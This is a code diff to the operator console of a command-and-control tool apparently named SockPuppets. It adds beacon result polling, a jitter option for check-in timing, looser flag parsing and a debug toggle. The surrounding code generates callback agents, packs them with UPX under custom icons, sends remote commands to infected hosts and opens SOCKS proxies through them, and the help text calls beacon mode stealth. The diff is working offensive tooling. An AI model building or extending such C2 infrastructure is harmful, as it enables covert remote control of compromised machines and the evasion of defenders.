@@ -8,6 +8,7 @@ import asyncio
 import cmd
 import sys
 import os
+import time
 from pathlib import Path
 from agent import AgentGenerator
 from server import get_server_instance, start_server
@@ -208,129 +209,197 @@ class SockPuppetsCLI(cmd.Cmd):
         if mode == 'beacon':
             print(f"[*] Beacon interval: {agent_info['beacon_interval']}s")
         print("[*] Type 'back' to return to main menu")
+        print("[*] Type 'results' to view pending results")
         print("[*] Type 'socks <port>' to start SOCKS proxy")
         print("[*] Type 'sleep <seconds>' to set beacon interval")
         print("[*] Type 'upgrade' to switch to streaming mode")
         print("[*] Type 'downgrade [seconds]' to switch to beacon mode")
 
-        while self.current_agent:
-            try:
-                command = input(f"\033[1;33magent[{agent_id}]>\033[0m ").strip()
+        # Track last seen results for auto-display
+        last_result_count = 0
+        result_check_thread = None
+        stop_checking = threading.Event()
 
-                if command.lower() == 'back':
-                    self.current_agent = None
-                    print("[*] Returning to main menu")
-                    break
+        def check_results():
+            """Background thread to check for new results"""
+            nonlocal last_result_count
+            while not stop_checking.is_set() and self.current_agent:
+                try:
+                    if mode == 'beacon':
+                        current_results = self.server.get_agent_results(agent_id, clear=False)
+                        if len(current_results) > last_result_count:
+                            # New results arrived
+                            new_results = current_results[last_result_count:]
+                            for res in new_results:
+                                cmd_text = res.get('command', 'Unknown')
+                                output = res.get('output', '')
+                                print(f"\n\033[1;32m[+] Result for: {cmd_text}\033[0m")
+                                print(output)
+                                print(f"\033[1;33magent[{agent_id}]>\033[0m ", end='', flush=True)
+                            last_result_count = len(current_results)
+                            # Clear results after displaying
+                            self.server.get_agent_results(agent_id, clear=True)
+                            last_result_count = 0
+                except Exception:
+                    pass
+                time.sleep(1)  # Check every second
 
-                if command.lower().startswith('socks'):
-                    parts = command.split()
-                    if len(parts) != 2:
-                        print("[-] Usage: socks <port>")
+        # Start result checking thread for beacon mode
+        if mode == 'beacon':
+            result_check_thread = threading.Thread(target=check_results, daemon=True)
+            result_check_thread.start()
+
+        try:
+            while self.current_agent:
+                try:
+                    command = input(f"\033[1;33magent[{agent_id}]>\033[0m ").strip()
+
+                    if command.lower() == 'back':
+                        self.current_agent = None
+                        print("[*] Returning to main menu")
+                        break
+
+                    if command.lower() == 'results':
+                        # Show pending results from beacon
+                        results = self.server.get_agent_results(agent_id, clear=False)
+                        if not results:
+                            print("[*] No pending results")
+                        else:
+                            print(f"\n[+] Pending Results ({len(results)}):")
+                            print("=" * 80)
+                            for i, res in enumerate(results, 1):
+                                cmd = res.get('command', 'Unknown')
+                                output = res.get('output', '')
+                                received = res.get('received_at', '')
+                                print(f"\n[{i}] Command: {cmd}")
+                                print(f"    Received: {received}")
+                                print(f"    Output:\n{output}")
+                                print("-" * 80)
+
+                            # Ask if they want to clear
+                            try:
+                                clear_choice = input("\nClear these results? [y/N]: ").strip().lower()
+                                if clear_choice == 'y':
+                                    self.server.get_agent_results(agent_id, clear=True)
+                                    print("[+] Results cleared")
+                            except:
+                                pass
                         continue
 
-                    try:
-                        socks_port = int(parts[1])
-                        if not self.loop:
-                            print("[-] Event loop not available")
+                    if command.lower().startswith('socks'):
+                        parts = command.split()
+                        if len(parts) != 2:
+                            print("[-] Usage: socks <port>")
                             continue
 
-                        future = asyncio.run_coroutine_threadsafe(
-                            self.server.start_socks_proxy(agent_id, socks_port),
-                            self.loop
-                        )
-                        result = future.result(timeout=5)
-                        print(f"[+] {result}")
-                    except ValueError:
-                        print("[-] Invalid port number")
-                    except Exception as e:
-                        print(f"[-] Error: {str(e)}")
-                    continue
+                        try:
+                            socks_port = int(parts[1])
+                            if not self.loop:
+                                print("[-] Event loop not available")
+                                continue
 
-                if command.lower().startswith('sleep'):
-                    parts = command.split()
-                    if len(parts) != 2:
-                        print("[-] Usage: sleep <seconds>")
+                            future = asyncio.run_coroutine_threadsafe(
+                                self.server.start_socks_proxy(agent_id, socks_port),
+                                self.loop
+                            )
+                            result = future.result(timeout=5)
+                            print(f"[+] {result}")
+                        except ValueError:
+                            print("[-] Invalid port number")
+                        except Exception as e:
+                            print(f"[-] Error: {str(e)}")
                         continue
 
-                    try:
-                        interval = int(parts[1])
-                        if not self.loop:
-                            print("[-] Event loop not available")
+                    if command.lower().startswith('sleep'):
+                        parts = command.split()
+                        if len(parts) != 2:
+                            print("[-] Usage: sleep <seconds>")
                             continue
 
-                        future = asyncio.run_coroutine_threadsafe(
-                            self.server.set_beacon_interval(agent_id, interval),
-                            self.loop
-                        )
-                        result = future.result(timeout=5)
-                        print(f"[+] {result}")
-                    except ValueError:
-                        print("[-] Invalid interval")
-                    except Exception as e:
-                        print(f"[-] Error: {str(e)}")
-                    continue
-
-                if command.lower() == 'upgrade':
-                    if not self.loop:
-                        print("[-] Event loop not available")
-                        continue
-
-                    try:
-                        future = asyncio.run_coroutine_threadsafe(
-                            self.server.upgrade_to_streaming(agent_id),
-                            self.loop
-                        )
-                        result = future.result(timeout=5)
-                        print(f"[+] {result}")
-                    except Exception as e:
-                        print(f"[-] Error: {str(e)}")
-                    continue
-
-                if command.lower().startswith('downgrade'):
-                    parts = command.split()
-                    interval = 60
-                    if len(parts) == 2:
                         try:
                             interval = int(parts[1])
+                            if not self.loop:
+                                print("[-] Event loop not available")
+                                continue
+
+                            future = asyncio.run_coroutine_threadsafe(
+                                self.server.set_beacon_interval(agent_id, interval),
+                                self.loop
+                            )
+                            result = future.result(timeout=5)
+                            print(f"[+] {result}")
                         except ValueError:
                             print("[-] Invalid interval")
+                        except Exception as e:
+                            print(f"[-] Error: {str(e)}")
+                        continue
+
+                    if command.lower() == 'upgrade':
+                        if not self.loop:
+                            print("[-] Event loop not available")
                             continue
+
+                        try:
+                            future = asyncio.run_coroutine_threadsafe(
+                                self.server.upgrade_to_streaming(agent_id),
+                                self.loop
+                            )
+                            result = future.result(timeout=5)
+                            print(f"[+] {result}")
+                        except Exception as e:
+                            print(f"[-] Error: {str(e)}")
+                        continue
+
+                    if command.lower().startswith('downgrade'):
+                        parts = command.split()
+                        interval = 60
+                        if len(parts) == 2:
+                            try:
+                                interval = int(parts[1])
+                            except ValueError:
+                                print("[-] Invalid interval")
+                                continue
+
+                        if not self.loop:
+                            print("[-] Event loop not available")
+                            continue
+
+                        try:
+                            future = asyncio.run_coroutine_threadsafe(
+                                self.server.downgrade_to_beacon(agent_id, interval),
+                                self.loop
+                            )
+                            result = future.result(timeout=5)
+                            print(f"[+] {result}")
+                        except Exception as e:
+                            print(f"[-] Error: {str(e)}")
+                        continue
+
+                    if not command:
+                        continue
 
                     if not self.loop:
                         print("[-] Event loop not available")
-                        continue
+                        break
 
-                    try:
-                        future = asyncio.run_coroutine_threadsafe(
-                            self.server.downgrade_to_beacon(agent_id, interval),
-                            self.loop
-                        )
-                        result = future.result(timeout=5)
-                        print(f"[+] {result}")
-                    except Exception as e:
-                        print(f"[-] Error: {str(e)}")
-                    continue
+                    future = asyncio.run_coroutine_threadsafe(
+                        self.server.send_command_to_agent(agent_id, command),
+                        self.loop
+                    )
 
-                if not command:
-                    continue
+                    print("[*] Executing command...")
+                    result = future.result(timeout=35)
+                    print(result)
 
-                if not self.loop:
-                    print("[-] Event loop not available")
-                    break
-
-                future = asyncio.run_coroutine_threadsafe(
-                    self.server.send_command_to_agent(agent_id, command),
-                    self.loop
-                )
-
-                print("[*] Executing command...")
-                result = future.result(timeout=35)
-                print(result)
-
-            except KeyboardInterrupt:
-                print("\n[*] Use 'back' to return to main menu")
-            except Exception as e:
-                print(f"[-] Error: {str(e)}")
+                except KeyboardInterrupt:
+                    print("\n[*] Use 'back' to return to main menu")
+                except Exception as e:
+                    print(f"[-] Error: {str(e)}")
+        finally:
+            # Stop result checking thread
+            stop_checking.set()
+            if result_check_thread:
+                result_check_thread.join(timeout=2)
 
     def do_generate(self, arg):
         """Generate agents: generate <host> <port> [options]"""
@@ -341,6 +410,7 @@ class SockPuppetsCLI(cmd.Cmd):
             print("    Options:")
             print("      --beacon               Enable beacon mode")
             print("      --interval=N           Beacon interval in seconds")
+            print("      --jitter=N             Beacon jitter percentage (0-100)")
             print("      --compile              Compile Python agent to executable")
             print("      --arch=ARCH            Target architecture (x86, x64, arm64)")
             print("      --multi-arch           Compile for all architectures")
@@ -355,28 +425,67 @@ class SockPuppetsCLI(cmd.Cmd):
         compile_exe = False
         beacon_mode = False
         beacon_interval = 60
+        beacon_jitter = 0
         architectures = ['x64']
         use_upx = True
         icon = None
 
-        for arg in args:
-            if arg.startswith('--key='):
-                key = arg.split('=', 1)[1]
-            elif arg.startswith('--interval='):
+        i = 0
+        while i < len(args):
+            arg = args[i]
+
+            # Helper to get next value (supports both --flag=value and --flag value)
+            def get_value(flag_name):
+                nonlocal i
+                if '=' in arg:
+                    return arg.split('=', 1)[1]
+                elif i + 1 < len(args):
+                    i += 1
+                    return args[i]
+                else:
+                    print(f"[-] {flag_name} requires a value")
+                    return None
+
+            if arg.startswith('--key'):
+                val = get_value('--key')
+                if val is None:
+                    return
+                key = val
+            elif arg.startswith('--interval'):
+                val = get_value('--interval')
+                if val is None:
+                    return
                 try:
-                    beacon_interval = int(arg.split('=', 1)[1])
+                    beacon_interval = int(val)
                 except ValueError:
                     print("[-] Invalid interval value")
                     return
-            elif arg.startswith('--arch='):
-                arch = arg.split('=', 1)[1]
-                if arch in ['x86', 'x64', 'arm64']:
-                    architectures = [arch]
-                else:
-                    print(f"[-] Invalid architecture: {arch}")
+            elif arg.startswith('--jitter'):
+                val = get_value('--jitter')
+                if val is None:
                     return
-            elif arg.startswith('--icon='):
-                icon = arg.split('=', 1)[1]
+                try:
+                    beacon_jitter = int(val)
+                    if beacon_jitter < 0 or beacon_jitter > 100:
+                        print("[-] Jitter must be between 0 and 100")
+                        return
+                except ValueError:
+                    print("[-] Invalid jitter value")
+                    return
+            elif arg.startswith('--arch'):
+                val = get_value('--arch')
+                if val is None:
+                    return
+                if val in ['x86', 'x64', 'arm64']:
+                    architectures = [val]
+                else:
+                    print(f"[-] Invalid architecture: {val}")
+                    return
+            elif arg.startswith('--icon'):
+                val = get_value('--icon')
+                if val is None:
+                    return
+                icon = val
                 if not os.path.exists(icon):
                     print(f"[-] Icon file not found: {icon}")
                     return
@@ -398,6 +507,8 @@ class SockPuppetsCLI(cmd.Cmd):
                     print("[-] Invalid port number")
                     return
 
+            i += 1
+
         if not host or port is None:
             print("[-] Usage: generate <host> <port> [options]")
             return
@@ -406,7 +517,8 @@ class SockPuppetsCLI(cmd.Cmd):
         if key != 'SOCKPUPPETS_KEY_2026':
             print(f"[*] Using custom encryption key")
         if beacon_mode:
-            print(f"[*] Beacon mode enabled ({beacon_interval}s interval)")
+            jitter_text = f" ±{beacon_jitter}%" if beacon_jitter > 0 else ""
+            print(f"[*] Beacon mode enabled ({beacon_interval}s{jitter_text} interval)")
         if compile_exe:
             print(f"[*] Compilation enabled for: {', '.join(architectures)}")
             if use_upx:
@@ -415,7 +527,7 @@ class SockPuppetsCLI(cmd.Cmd):
                 print(f"[*] Using icon: {icon}")
 
         generator = AgentGenerator()
-        results = generator.generate_all(host, port, key, beacon_mode, beacon_interval,
+        results = generator.generate_all(host, port, key, beacon_mode, beacon_interval, beacon_jitter,
                                         compile_exe, architectures, use_upx, icon)
 
         print("\n[+] Agent generation complete!")
@@ -425,6 +537,28 @@ class SockPuppetsCLI(cmd.Cmd):
                 print(f"  {agent_type.upper()}: {path}")
             else:
                 print(f"  {agent_type.upper()}: {path}")
+
+    def do_debug(self, arg):
+        """Toggle debug mode: debug [on|off]"""
+        import logging
+
+        if not arg:
+            # Show current status
+            current_level = logging.getLogger().level
+            status = "ON" if current_level == logging.DEBUG else "OFF"
+            print(f"[*] Debug mode is currently: {status}")
+            print("[*] Usage: debug [on|off]")
+            return
+
+        arg = arg.strip().lower()
+        if arg == 'on':
+            logging.getLogger().setLevel(logging.DEBUG)
+            print("[+] Debug mode enabled")
+        elif arg == 'off':
+            logging.getLogger().setLevel(logging.INFO)
+            print("[+] Debug mode disabled")
+        else:
+            print("[-] Invalid argument. Use: debug [on|off]")
 
     def do_clear(self, arg):
         """Clear the screen"""
@@ -459,6 +593,7 @@ class SockPuppetsCLI(cmd.Cmd):
         print("  \033[1mstreamers\033[0m                            - List only streaming agents")
         print("  \033[1minteract <agent_id>\033[0m                  - Interact with an agent")
         print("  \033[1mgenerate <host> <port> [opts]\033[0m       - Generate agent payloads")
+        print("  \033[1mdebug [on|off]\033[0m                       - Toggle debug logging")
         print("  \033[1mclear\033[0m                                - Clear the screen")
         print("  \033[1mexit/quit\033[0m                            - Exit the program")
         print()
@@ -466,6 +601,7 @@ class SockPuppetsCLI(cmd.Cmd):
         print("=" * 70)
         print("  \033[1m--beacon\033[0m              Enable beacon mode (stealth)")
         print("  \033[1m--interval=N\033[0m          Beacon check-in interval in seconds")
+        print("  \033[1m--jitter=N\033[0m            Beacon jitter percentage (0-100)")
         print("  \033[1m--compile\033[0m             Compile Python agent to executable")
         print("  \033[1m--arch=ARCH\033[0m           Target architecture (x86, x64, arm64)")
         print("  \033[1m--multi-arch\033[0m          Compile for all architectures")
@@ -476,6 +612,7 @@ class SockPuppetsCLI(cmd.Cmd):
         print("\033[1mAgent Commands:\033[0m")
         print("=" * 70)
         print("  \033[1mback\033[0m                  Return to main menu")
+        print("  \033[1mresults\033[0m               View pending beacon results")
         print("  \033[1msocks <port>\033[0m          Start SOCKS5 proxy on port")
         print("  \033[1msleep <seconds>\033[0m       Set beacon interval")
         print("  \033[1mupgrade\033[0m               Upgrade to streaming mode")
